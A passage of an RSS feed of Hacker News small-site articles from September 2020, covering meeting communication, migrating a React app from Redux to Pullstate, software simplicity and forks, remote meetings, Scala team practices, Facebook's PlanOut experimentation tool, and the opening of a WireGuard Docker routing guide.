<p>Lastly, I would like to note although people inherently vary in how empathetic they are, it is also a skill that can be cultivated. &nbsp; So make it a mindset that you work actively to engage in.&nbsp; Cultivate your curiosity. If you struggle with it, try meditation. Its core teaching is the power of developing an open loving curiosity about the world.&nbsp; I‚Äôve spent a week in silent meditation, and I can tell you that if you can find the in and out flow of your breath to be fascinating, then it becomes easy to be intrigued by the perspective of your peers.&nbsp;</p>



<figure><img loading="lazy" src="https://ansonwhitmer.com/wp-content/uploads/2020/09/image-1024x299.png" alt="" width="490" height="142" srcset="https://ansonwhitmer.com/wp-content/uploads/2020/09/image-1024x299.png 1024w, https://ansonwhitmer.com/wp-content/uploads/2020/09/image-300x88.png 300w, https://ansonwhitmer.com/wp-content/uploads/2020/09/image-768x224.png 768w, https://ansonwhitmer.com/wp-content/uploads/2020/09/image.png 1138w" sizes="(max-width: 490px) 85vw, 490px"><figcaption>Monitoring ‚Äì keep the conversation within the lines</figcaption></figure>



<p><strong>Monitoring ‚Äì keep the conversation on track</strong></p>



<p>The part of the brain involved in understanding and solving a problem, the dorsolateral prefrontal cortex, is distinct from the part of the brain, the medial prefrontal cortex, that is involved in monitoring your environment and behavior for errors that signal a course correction is needed.&nbsp; I have noticed that leaders, who are great at moving a team towards optimal solutions, are able to keep this monitoring brain area highly activated even as they also help the team move towards a solution.&nbsp; They tend to be constantly scanning the conversation at a meta-level looking for issues that will derail it.&nbsp; So what type of issues are they monitoring for?&nbsp;</p>



<p><em>Establish what you are monitoring for and set the conditions.&nbsp; </em>To know what to monitor for, you first need to clearly identify, at the start of a meeting, what your agenda is and what the basic problem(s) is that you will address.&nbsp; Once there is consensus here, it will be clearer to you if the conversation has moved off track and what you should be monitoring for.&nbsp; Moreover, it also ensures that you have needed conditions for keeping the conversation on track.&nbsp; For example, given your agenda, you should evaluate whether you even have the right decision makers in the room.&nbsp; Do you have unnecessary people who can push the conversation into tangents or are you lacking the needed people so that even if you make a decision, you may not be able to act upon that decision?&nbsp;&nbsp;&nbsp;</p>



<p><em>Conversation below the right level?&nbsp; </em>Is someone ‚Äúgoing into the weeds‚Äù by diving into a technical explanation that isn‚Äôt needed right now? &nbsp; Monitor for this and pull the group out quickly. &nbsp; At best, it is just a waste of time.&nbsp; At worst, it will derail the conversation.&nbsp;</p>



<p><em>Conversation above the right level?&nbsp; </em>Similarly, thoughts can steer the conversation to a level above the agenda.&nbsp; For example, if your company recently switched to a pods organization and there is some question about how to best handle ownership of one line of work in this new pod structure, it can be easy for the conversation to suddenly be about the pods themselves ‚Äì whether they are good and how to change and improve the pods.&nbsp; This level of conversation would be above the one set in your agenda, is not one that you want to or are capable of addressing in your current meeting, and if you even were interested in addressing it, you probably don‚Äôt have the right people in the room to do so.&nbsp; Pull ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ansonwhitmer.com/four-communication-techniques-for-solving-technical-problems/">https://ansonwhitmer.com/four-communication-techniques-for-solving-technical-problems/</a></em></p>]]>
            </description>
            <link>https://ansonwhitmer.com/four-communication-techniques-for-solving-technical-problems/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24585139</guid>
            <pubDate>Fri, 25 Sep 2020 00:10:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Migrating from Redux to Pullstate]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24585063">thread link</a>) | @marcusbuffett
<br/>
September 24, 2020 | https://mbuffett.com/posts/redux-to-pullstate/ | <a href="https://web.archive.org/web/*/https://mbuffett.com/posts/redux-to-pullstate/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Recently I migrated my side-project from Redux, which I‚Äôve used in every
React project for the past four years, to
<a href="https://github.com/lostpebble/pullstate">pullstate</a>, here is my tale.</p>
<h2 id="problems-with-redux">Problems with Redux</h2>
<p>Feel free to <a href="#introducing-pullstate">skip this part</a> if you already know the pain points of Redux,
there‚Äôs nothing in here that hasn‚Äôt been discussed a million times before. These
are the problems as I see them, most important first:</p>
<p><strong>The boilerplate</strong>. Oh man, the boilerplate. Want to add a counter? First, add
the field to your interface (I‚Äôm assuming TypeScript), add a default value,
create a new action type for the incrementing, write an action
creator, add the case to your reducer, add the dispatcher hook to your
component, dispatch your action creator. It‚Äôs exhausting just to list the
steps, nevermind actually doing it for every bit of state you need to keep track
of.</p>
<p><strong>Type-safety</strong>. Despite some valiant efforts to strong-arm the TypeScript
type system to work with a stringly-typed API like Redux, the state of the art
is still sorely lacking. If you go through all the hoops, you can get
type-checking, at the expense of even more boilerplate.</p>
<p><strong>Locality</strong>. I could go on a longer rant about the trade-off between de-coupling
and locality, I‚Äôll keep it to Redux. The symptom of the problem is that this:</p>
<div><pre><code data-lang="jsx">&lt;<span>div</span>
  <span>onClick</span><span>=</span>{() =&gt; {
    <span>state</span>.<span>counter</span><span>++</span>;
  }}
/&gt;
</code></pre></div><p>Which is easy to read, turns into this:</p>
<div><pre><code data-lang="jsx"><span>// component.tsx
</span><span></span>&lt;<span>div</span>
  <span>onClick</span><span>=</span>{() =&gt; {
    <span>dispatch</span>(<span>incrementCounter</span>());
  }}
/&gt;;
<span>// actionCreators.ts
</span><span></span><span>export</span> <span>const</span> <span>incrementCounter</span> <span>=</span> () =&gt; {
  <span>return</span> {
    <span>type</span><span>:</span> <span>AppAction</span>.<span>IncrementCounter</span>,
  };
};
<span>// reducer.ts
</span><span></span><span>export</span> <span>const</span> <span>reducer</span> <span>=</span> (<span>state</span><span>:</span> <span>AppState</span>, <span>action</span>) =&gt; {
  <span>// ...
</span><span></span>  <span>if</span> (<span>action</span>.<span>type</span> <span>==</span> <span>AppAction</span>.<span>IncrementCounter</span>) {
    <span>return</span> {
      ...<span>state</span>,
      <span>counter</span><span>:</span> <span>state</span>.<span>counter</span> <span>+</span> <span>1</span>,
    };
  }
  <span>// ...
</span><span></span>};
</code></pre></div><p>This gets described as ‚Äúde-coupling‚Äù, and ‚Äúseparation of concerns‚Äù. I think programmers saw
the MVC pattern and the SOLID principles, then came to the conclusion that
effects happening near their cause is a code smell. This is overly simplistic to
the point of being wrong, and locality as a principle should get way more
respect than it does; there‚Äôs value in having an effect close to its cause.
Locality is the trade-off to de-coupling, and sometimes de-coupling
needs to be called out as what it really is: indirection.</p>
<p>‚ÄúBut what if I‚Äôm doing something more complicated than incrementing a
counter, or want to reuse code? I don‚Äôt want all state logic in my component‚Äù. Functions.
What you‚Äôre looking for are functions.</p>
<p><strong>The mutation trap</strong>. Accidentally mutate your state? Hope you didn‚Äôt need your
UI to update.</p>
<p><strong>The boilerplate</strong>. Did I mention the boilerplate?</p>
<p>Redux has good things too, otherwise I wouldn‚Äôt have used it for the past four
years. It‚Äôs got a huge community, which has created loads of useful libraries.
But at the core, its implementation of the Elm architecture just doesn‚Äôt
translate well to JavaScript. With that venting out of the way‚Ä¶</p>
<h2 id="introducing-pullstate">Introducing Pullstate</h2>
<p><a href="https://github.com/lostpebble/pullstate">Pullstate</a> is a library built by
<a href="https://github.com/lostpebble">lostpebble</a>. As it describes itself:</p>
<blockquote>
<p>Ridiculously simple state stores with performant retrieval anywhere in your
React tree using the wonderful concept of React hooks!</p>
</blockquote>
<p>I migrated my project over to pullstate in a fit of boilerplate
frustration, and will never look back. By way of argument, I present <a href="https://github.com/marcusbuffett/rentseeker/commit/0dbf758dca23899b1112bd8d927dbe9914b5fd7c">the commit
where I switched from Redux to
pullstate</a>.
163 lines deleted and 86 lines added, and that‚Äôs with more actual logic. Any
library that cuts down my LoC by &gt;50% wins big points. 160 lines of
redux is obviously a tiny project. I also work on a web app with 1,000s of lines
of Redux and I can‚Äôt see why pullstate wouldn‚Äôt scale to that project, if I
could get a week or two off from more important tasks to work on it.</p>
<h3 id="boilerplate-gone">Boilerplate? Gone</h3>
<p>Since this was the most satisfying part, I‚Äôll highlight some of the bigger
chunks that were removed:</p>
<div><pre><code data-lang="diff">
Enum for action types? Gone.
<span>- export enum AppAction {
</span><span>-   AddInvestment = "AddInvestment",
</span><span>-   UpdateInvestment = "UpdateInvestment",
</span><span>-   ToggleSignInModal = "ToggleSignInModal",
</span><span>-   InvestmentUploaded = "InvestmentUploaded",
</span><span>-   Login = "Login",
</span><span>- }
</span><span></span>
Reducer? Gone.
<span>- export const appReducer = (state = defaultState, action) =&gt; {
</span><span>-   // bunch of lines...
</span><span>- };
</span><span></span>
C+P boilerplate to create a store? Gone.
<span>- const makeStore: MakeStore&lt;any&gt; = (context: Context) =&gt;
</span><span>-   createStore(
</span><span>-     appReducer,
</span><span>-     // @ts-ignore
</span><span>-     isSSR() ||
</span><span>-       (window.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp;
</span><span>-         window.__REDUX_DEVTOOLS_EXTENSION__())
</span><span>-   );
</span><span></span>
Some higher-order-component nonsense? Gone.
<span>- export const wrapper = createWrapper&lt;AppState&gt;(makeStore, { debug: true });
</span><span></span>
Passing my app into that higher-order component thing? Gone.
<span>- export default wrapper.withRedux(MyApp);
</span></code></pre></div><p>With pullstate, this is all it takes to create a store:</p>
<div><pre><code data-lang="typescript"><span>export</span> <span>const</span> <span>AppStore</span> <span>=</span> <span>new</span> <span>Store</span><span>&lt;</span>{
  <span>houses</span>: <span>Investment</span>[];
  <span>// other fields...
</span><span></span>}<span>&gt;</span>({
  <span>houses</span><span>:</span> [],
  <span>// other fields...
</span><span></span>});
</code></pre></div><p>No higher-order stuff I need to copy and paste for each project, just an
exported store I can now use anywhere, contained in one file.</p>
<h3 id="reading-from-the-store">Reading from the store</h3>
<p>Reading from the store looks very similar to Redux hooks:</p>
<div><pre><code data-lang="typescript"><span>import</span> { <span>AppStore</span> } <span>from</span> <span>"src/store"</span>;
<span>// Inside component:
</span><span></span><span>const</span> <span>initialized</span> <span>=</span> <span>AppStore</span>.<span>useState</span>((<span>s</span>) <span>=&gt;</span> <span>s</span>.<span>initialized</span>);
<span>// The redux equivalent:
</span><span>// const initialized = useSelector((s: AppState) =&gt; s.initialized);
</span></code></pre></div><p>Not a big difference, but with redux I have to annotate the type to get
TypeScript to type-check. Winner: pullstate by a hair.</p>
<h3 id="updating-the-store">Updating the store</h3>
<p>This is where pullstate really shines:</p>
<div><pre><code data-lang="jsx">&lt;<span>div</span>
  <span>onClick</span><span>=</span>{() =&gt; {
    <span>AppStore</span>.<span>update</span>((<span>s</span>) =&gt; {
      <span>s</span>.<span>houses</span>.<span>push</span>(<span>newHouse</span>);
    });
  }}
/&gt;
</code></pre></div><p>Pullstate uses <a href="https://github.com/immerjs/immer">immer</a> when calling the <code>update</code>
function, so there‚Äôs no need to worry about mutation. Modify your state how
you would if you didn‚Äôt care about mutation. Type-checking also works inside the
<code>update</code> function.</p>

<p>In short, it‚Äôs a minimal API that covers everything I needed Redux to
do but with more type-safety, less footguns, and none of the RSI-inducing
boilerplate. Given how positive my experience switching to pullstate has been, I
wish there was more of it to show. There‚Äôs more to it, but I haven‚Äôt used it,
and my word count is at a nice round 1024 so I‚Äôll leave it at that (yes, I did
remove other stuff to keep it at 1024 after that note (and yes,
I removed <em>more</em> stuff to have that bit of parenthisized clarification (also,
yes, ‚Ä¶))).</p>

        </div></div>]]>
            </description>
            <link>https://mbuffett.com/posts/redux-to-pullstate/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24585063</guid>
            <pubDate>Thu, 24 Sep 2020 23:56:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[From the lab to production: session-based recommendations [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24584919">thread link</a>) | @gk1
<br/>
September 24, 2020 | https://edoliberty.github.io/papers/recsys2020thd.pdf | <a href="https://web.archive.org/web/*/https://edoliberty.github.io/papers/recsys2020thd.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://edoliberty.github.io/papers/recsys2020thd.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24584919</guid>
            <pubDate>Thu, 24 Sep 2020 23:34:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simplicity and Ecosystems]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24584576">thread link</a>) | @zdw
<br/>
September 24, 2020 | https://orib.dev/simplicity.html | <a href="https://web.archive.org/web/*/https://orib.dev/simplicity.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<p>Software for users should serve the needs of users, and
not the needs of giant corporations with nearly limitless
resources.</p>

<p>Forks are an essential part of ensuring that software
serves the user. When maintainers aren't serving user needs,
forking can allow users to resolve the situation.</p>

<p>Discontent with Xfree86 leadership led to the
X.org fork. The split was triggered by licensing,
but there were rumblings of discontent with the slow pace of
progress and closed leadership style. This fork dragged X11
kicking and screaming out of the 1980s, bringing dynamically
reconfigurable multihead, composited desktops, and working
hardware acceleration -- all while shrinking the codebase
by more than 10,000 lines for the first several releases.</p>

<p>Discontent with the slow progress of GCC development
led to the EGCS fork. EGCS added many optimizations for
contemporary processors, improved C++ support, added more
frontends, and generally improved things. This fork proved
so successful that the original GCC ceased development.
EGCS got rebranded as GCC, and replaced the original.</p>

<p>There are many other examples of successful forks. Many
are former Sun projects, which forked after Oracle took
ownership.</p>

<p>But for forks to be possible, the projects need to
be simple enough to be forkable. Even better, they need
to be simple enough that multiple alternative implementations
can coexist, all growing independently and serving separate
niches.</p>

<p>Complexity forms barriers. These barriers can squeeze
out alternative implementations by increasing the resources
needed to maintain a fork. They make it harder for
a community to form and provide alternatives to users.</p>

<p>On top of that, if the costs of maintenance are high,
a source of money becomes necessary. This means either a revenue
stream, or an investor that expects a return on their investment.
Monetization becomes necessary.</p>

<p>This can result in a feedback loop. Implementers that
aren't raking in the megabucks drop out. Those who remain standing
grow their market share. They benefit from a rise in complexity
and the barriers that come with it. Because there are fewer options,
they can tighten the screws further to increase revenue, which
increases their ability to fund complexity. This can push the weaker
players out of the market, and the cycle repeats.</p>

<p>The result of this is that only a small number of well-funded
implementations survive, all of them trying to maximize profits.
Without people able to maintain viable forks, the owners of an
implementation can set a direction, and users are dragged along.</p>

<p>At this point, some of you are certainly thinking of
browsers. Browsers are just one cautionary tale. Manifest V3
is being rammed through, hobbling ad blockers.
This change would be harder to make stick if users have
places to go. But the choices are Chrome, Firefox, and Safari.
The first two are funded by Google ads.</p>

<p>But the problems caused by complexity aren't restricted to
browsers. Network protocols, deployment tools, operating systems,
init systems, and file formats are all at risk. As the complexity
grows, the ability to own our software decreases.</p>

<p>Open standards aren't enough for healthy ecosystems. Both
standards and their implementations need to be simple enough
to fork and maintain.</p>



</div>]]>
            </description>
            <link>https://orib.dev/simplicity.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24584576</guid>
            <pubDate>Thu, 24 Sep 2020 22:46:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimize Your Meetings for Engagement]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24584109">thread link</a>) | @w1nter
<br/>
September 24, 2020 | https://frantic.im/remote-meetings | <a href="https://web.archive.org/web/*/https://frantic.im/remote-meetings">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <header>
    
    
  </header>
  <p>‚Äî So, does anybody have any feedback? Or questions?</p>

<p>Silence. 15 seconds feel like forever. I can‚Äôt tell by people‚Äôs expressions if they agree with what I have just presented. I know they must have things to say, why aren‚Äôt they speaking up?</p>

<p>This was so much easier with in-person meetings. Remote sucks!</p>

<h2 id="what-if-we-just-dont-know-how-to-run-remote-meetings-yet">What if we just don‚Äôt know how to run remote meetings yet?</h2>

<p>After months of attending large VC-only meetings I think I found a pattern. I‚Äôve also talked to a few people who also noticed the same thing.</p>

<p><strong>Failure modes:</strong></p>

<ul>
  <li>The person leading the meeting is talking 90% of time, and because they don‚Äôt get much feedback they just continue to fill the silence with re-iterating their points.</li>
  <li>Nobody else is speaking up.</li>
  <li>Somebody‚Äôs speaking up but they focus on a minor detail and talk through it forever, nobody‚Äôs willing to stop them</li>
  <li>In the end everyone is frustrated, the meeting feels like a waste of time and feels like it could have been replaced by a group post.</li>
</ul>

<p>But not all meetings where like that. A few were actually really good.</p>

<p><strong>Here‚Äôs the secret sauce:</strong></p>

<blockquote>
  <p>In the current realities optimize your meetings for engagement</p>
</blockquote>

<p>By engagement I mean this ‚Äî imagine you meet a bunch of old friends that you haven‚Äôt seen in a while. Everybody‚Äôs sharing their stories, and everybody else is actively listening, asking questions, and are fully immersed.</p>

<p>Just imagine the things we could do if our remote meetings felt even remotely like that.</p>

<p>First of all, it‚Äôs a mindset shift. Switch your strategy from just doing the meetings the way you did before COVID (or the way everybody else is doing it right now) to optimizing for the engagement, and wonderful things will happen.</p>

<p>I think the solution has 3 key elements: organizational, human and technology.</p>

<p><strong>Organizational:</strong></p>

<ul>
  <li>Reserve 15 minutes in the beginning to warm up your group. Don‚Äôt do ‚Äúlet‚Äôs start with status update‚Äù ‚Äî in my experience this tenses up the people involved and they mainly think about what they are going to say and are not listening / engaging. Instead, ask a question that encourages engagement (see next section).</li>
  <li>If your goal is to generate ideas or collect meaningful feedback, split the large group into several smaller groups (see <a href="http://www.theworldcafe.com/key-concepts-resources/world-cafe-method/">World Cafe Method</a>). 4 or 5 people in the meeting seem to be the maximum we can handle to keep the engagement high.</li>
</ul>

<p><strong>Human:</strong></p>

<ul>
  <li>Ask and share personal bits of information, e.g. hobbies, silly facts, or opinions on things not related to work.</li>
  <li>Overuse non-verbal expressions: gestures, smiles, nodding, etc. This will help everyone else understand your reaction.</li>
</ul>

<p><strong>Technology:</strong></p>

<ul>
  <li>Audio is extremely important. Low latency is a must to avoid people talking over each other.  The quality is very important too, good software I‚Äôve used before doesn‚Äôt broadcast your audio until it detects speech.</li>
  <li>Provide tools that expand ways to communicate non-verbally: raising hand, reactions, polls, messages.</li>
</ul>

  
  






  <div>
  <div>
    <p>Hi! My name is Alex. I‚Äôm a software engineer at Facebook, where I work on React&nbsp;Native, Oculus and Messenger. I love thinking about development experience.</p>
    <p>I write about programming, software design and side projects <a href="https://frantic.im/subscribe/" target="_blank"><svg viewBox="0 0 800 800"><path d="M493 652H392c0-134-111-244-244-244V307c189 0 345 156 345 345zm71 0c0-228-188-416-416-416V132c285 0 520 235 520 520z"></path><circle cx="219" cy="581" r="71"></circle></svg> Subscribe</a></p>
  </div>
</div>

</article></div>]]>
            </description>
            <link>https://frantic.im/remote-meetings</link>
            <guid isPermaLink="false">hacker-news-small-sites-24584109</guid>
            <pubDate>Thu, 24 Sep 2020 21:52:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scala ‚Äì Just enough rope to hang yourself (2013)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24583811">thread link</a>) | @todsacerdoti
<br/>
September 24, 2020 | https://quii.dev/Scala_-_Just_enough_rope_to_hang_yourself | <a href="https://web.archive.org/web/*/https://quii.dev/Scala_-_Just_enough_rope_to_hang_yourself">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content"><article id="Scala - Just enough rope to hang yourself"><header><time>02 December 2013</time></header><p>Last week <a href="https://twitter.com/shinyhappydan">Dan</a> and I did a presentation at the <a href="http://joinit.springer.com/">Springer</a> offices for the <a href="https://www.meetup.com/Functional-Media/">Functional Media meetup</a> about our experiences with Scala. We thought it would be interesting to talk about the mistakes we had made with Scala as we thought that would be more interesting than rehashing a number of other talks about why Scala is or isn't good.</p>
<p><a href="https://docs.google.com/presentation/d/1_IcQejhu8byqUMj8MFqVeN3L_EitnVxwG0WUrYV3meE/pub?start=false&amp;loop=false&amp;delayms=3000">You can find the slides here</a></p>
<p>Scala is a very feature rich language and because of this there are many ways of doing things. This was how Scala was designed, to allow developers to express themselves in a flexible way in comparison to languages like Java.</p>
<p>This flexibility is a double-edged sword and I think this not only effects our team but can also effect the OSS community around Scala. Some developers see the power in being able to write DSLs or construct cool type systems which they think will be really useful but aren't actually as generalised and good as they think and can hamstring other developers. As Jeff Atwood says <a href="http://www.codinghorror.com/blog/2013/07/rule-of-three.html">writing re-usable code is hard</a> and that is especially true when with a flexible language like Scala.</p>
<p>This immediately comes to mind when I read this post by <a href="http://overwatering.org/blog/2013/12/scala-1-star-would-not-program-again/">Giles Alexander</a>.</p>
<p>I can actually appreciate some of the author's sentiments. If I started Scala without the aid of working with some very experienced programmers in a pair programming environment I imagine I would find it a nightmare too.</p>
<p>His complaints about def and val to me seem like inexperience in his team with Scala, which then means the resulting code is difficult for everyone. Again, this is Scala's flexibility hurting a team. I actually think good Scala code reads really well, but it takes some discipline and knowhow. Scala can tempt you into writing code you think looks great but is very hard for other people to read.</p>
<h2>Lessons from our talk</h2>
<p>If you want to have a productive team working with Scala, we feel you need</p>
<ul>
<li><em>An enthusiastic team</em> - A team that really wants to learn Scala where individuals demonstrate new powerful ways of getting stuff done to the rest of the team</li>
<li><em>Pair programming</em> - This helps newer people get up to scratch with Scala.</li>
<li><em>Code review</em> - You want to encourage your team to learn how to weild Scala's power but at Springer we make sure we have weekly team code review where we go over code so everyone understands</li>
<li><em>Question things</em> - "The functional way" is not a catch-all argument winner. Leveraging Scala's power is great but readability is the most important factor in code for us.</li>
<li><em>Monitor build times</em> - You cant really avoid Scala's compilation problems. But if you invest a little time with CI to measure it, you can take steps to manage it.</li>
</ul>
<h2>Generalists</h2>
<p>There seems to be a demand on a lot of developers to be "generalists" who know a number of languages and can be productive with them. This is a perfectly valid goal as it means developers generally have a broad and open mind about technical approach.</p>
<p>I'm not entirely sure if Scala is well suited to this as to write <em>good</em> Scala requires you to put effort into learning and appreciating the language. It is a power tool and it means you have to spend time to know how to use it responsibly so you can write concise, readable code.</p>
<p>Some would say this is a bad thing, but after working with Scala for a number of years now and if I was to change language I would want to make sure I picked a language which offers the same power and flexibility of Scala; otherwise I would probably feel like I am fighting the language to get things done.</p>
<p>I totally understand when people accuse Scala being cryptic and bloated, but I think that mainly comes from either using a horrible library of just being inexperienced. I think the true power of Scala is that it gives me the opportunity to express the intent of my code without the need of complicated boilerplate. However, it takes time to get good at it and to be honest that's what I like about it, there's always more to learn.</p>
</article></section></div>]]>
            </description>
            <link>https://quii.dev/Scala_-_Just_enough_rope_to_hang_yourself</link>
            <guid isPermaLink="false">hacker-news-small-sites-24583811</guid>
            <pubDate>Thu, 24 Sep 2020 21:20:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Planout: Developer Friendly Experimentation Tool by Facebook]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24583660">thread link</a>) | @softvar
<br/>
September 24, 2020 | https://facebook.github.io/planout/docs/why-planout.html | <a href="https://web.archive.org/web/*/https://facebook.github.io/planout/docs/why-planout.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div>

<nav>
  
    <section>
      <h3>Quick start</h3>
      <ul>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/why-planout.html">
              Why PlanOut?
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/getting-started.html">
              Getting started
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/sample-web-app.html">
              Sample Web app
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/about-planout.html">
              About PlanOut
            </a>
            
          </li>
        
      </ul>
    </section>
  
    <section>
      <h3>Guides</h3>
      <ul>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/how-planout-works.html">
              How PlanOut works
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/random-operators.html">
              Random operators
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/logging.html">
              Logging
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/testing.html">
              Testing
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/planout-language.html">
              The PlanOut language
            </a>
            
              <ul>
                
                  <li>
                    <a href="https://facebook.github.io/planout/docs/getting-started-with-the-interpreter.html">
                      Getting started
                    </a>
                  </li>
                
                  <li>
                    <a href="https://facebook.github.io/planout/docs/planout-language-reference.html">
                      Language reference
                    </a>
                  </li>
                
              </ul>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/namespaces.html">
              Namespaces
            </a>
            
              <ul>
                
                  <li>
                    <a href="https://facebook.github.io/planout/docs/simple-namespaces.html">
                      Quick start
                    </a>
                  </li>
                
              </ul>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/best-practices.html">
              Best practices
            </a>
            
          </li>
        
      </ul>
    </section>
  
    <section>
      <h3>Extending PlanOut</h3>
      <ul>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/extending-logging.html">
              Extending logging
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/creating-new-operators.html">
              Creating new operators
            </a>
            
          </li>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/creating-random-operators.html">
              Creating random operators
            </a>
            
          </li>
        
      </ul>
    </section>
  
    <section>
      <h3>Ports</h3>
      <ul>
        
          <li>
            <a href="https://facebook.github.io/planout/docs/ports-overview.html">
              Overview
            </a>
            
          </li>
        
      </ul>
    </section>
  
</nav>


<article>
    
    

    <p>A/B tests and other randomized experiments are widely used as part of continually improving Web and mobile apps and services. PlanOut makes it easy to run both simple and complex experiments.</p>

<h3 id="focus-on-parameters">Focus on parameters</h3>

<p>PlanOut is all about providing randomized values of parameters that control your service. Instead of using a constant, just use PlanOut to determine these parameters (e.g., text size or color, the presence of a new feature, the number of items in a list). Now you have an experiment.</p>

<h3 id="from-simple-to-complex">From simple to complex</h3>

<p>It is easy to implement an A/B test in PlanOut, or other simple experiments like those involving a factorial design. But is not much harder to implement more complex designs. Multiple types of units (e.g., users, pieces of content) can be randomly assigned to parameter values in the same experiment. Experiments can also involve directly randomizing other inputs, such as randomly selecting which three friends to display to a user.</p>

<h3 id="automatic-logging">Automatic logging</h3>
<p>You will often want to keep track of which users (or other units) have been exposed to your experiment. This can make subsequent analysis more precise and prevent common errors in analysis. PlanOut calls your logging code whenever a parameter value is checked.</p>

<h3 id="advanced-features">Advanced features</h3>

<p>We created PlanOut to meet requirements from running experiments at Facebook, which gives rise to some of its more advanced features.</p>

<h4 id="serialization">Serialization</h4>
<p>Experiments can also be specified through JSON code. This can enable separate review processes for changes to the experiment, support multi-platform execution, and restrict the range of operations that should occur during experimental assignment (for reasons of, e.g., performance, correctness, static analysis). It also allows developers to implement their own tools to specify experiments without writing any code at all.</p>

<h4 id="domain-specific-language">Domain-specific language</h4>
<p>PlanOut experiments can be specified through the PlanOut language, which concisely describes an experiment using a set of primitive operations.  PlanOut language code is compiled into the JSON serialization, which can be executed by the PlanOut interpreter as needed.</p>

<h4 id="iterative-experimentation">Iterative experimentation</h4>
<p>The PlanOut library includes a basic <a href="https://facebook.github.io/planout/docs/namespaces.html">namespace class</a> for managing multiple, iterative experiments that run concurrently.</p>


    

</article>

</div></section></div>]]>
            </description>
            <link>https://facebook.github.io/planout/docs/why-planout.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24583660</guid>
            <pubDate>Thu, 24 Sep 2020 21:07:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simple WireGuard Docker network setup]]>
            </title>
            <description>
<![CDATA[
Score 68 | Comments 11 (<a href="https://news.ycombinator.com/item?id=24583512">thread link</a>) | @bjoko
<br/>
September 24, 2020 | https://www.eisfunke.com/article/docker-wireguard-systemd.html | <a href="https://web.archive.org/web/*/https://www.eisfunke.com/article/docker-wireguard-systemd.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
                        A simple solution for routing specific docker containers through a WireGuard VPN using only two simple systemd-networkd files, no cumbersome <code>wg</code> or <code>ip</code> calls.
                    </p><div id="article">
                <!-- Body -->
<figure>
<img src="https://www.eisfunke.com/res/article/metro-tunnel.jpg" alt=""><figcaption>I heard that dramatic article images heavy with meaning are a meme, so here you have a picture of a subway tunnel because VPNs are network tunnels. <a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></figcaption>
</figure>
<p><a href="#instructions-in-short">Jump to short instructions</a></p>
<p>I recently reorganized my self-hosted stuff to use Docker. While Docker not really fits my philosophy, the broad availability and low-maintenance of images for pretty much all software convinced me to switch and so far I‚Äôm happy, it‚Äôs significantly less work than before, I can check the Docker Compose files into version control, and backups are easy with everthing inside Docker volumes.</p>

<p>Anyway ‚Äì here is the scenario I want to talk about: You have one or more Docker containers and you want to route all its traffic through a WireGuard VPN, but not the other containers‚Äô or the host‚Äôs traffic. You have root access to the host machine.</p>

<h2 id="wg-quick">wg-quick</h2>
<p>The most straightforward way of using WireGuard is <a href="https://git.zx2c4.com/wireguard-tools/about/src/man/wg-quick.8"><em>wg-quick</em></a>. You just need a configuration file, about 10 lines long (take a look at an OpenVPN config file and you will appreciate this shortness), run <code>sudo wg-quick up {config file}</code> and your VPN is up and running. These files also work with the Android/iOS/MacOS/Windows apps.</p>
<p>For example, the VPN provider <a href="https://mullvad.net/">Mullvad</a>, which I can recommend 100%, lets you download wg-quick files for easy setup.</p>
